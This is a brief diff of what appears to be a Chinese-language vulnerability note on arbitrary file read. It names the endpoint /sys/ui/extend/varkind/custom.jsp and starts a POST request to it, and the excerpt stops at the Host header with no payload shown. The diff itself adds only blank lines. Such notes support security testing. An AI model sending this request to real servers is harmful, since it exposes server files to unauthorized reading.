@@ -1,6 +1,9 @@
 ## 0x01-任意文件读取
 
    访问/sys/ui/extend/varkind/custom.jsp
+ 
+ 
+
 
 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
 Host: host:8080
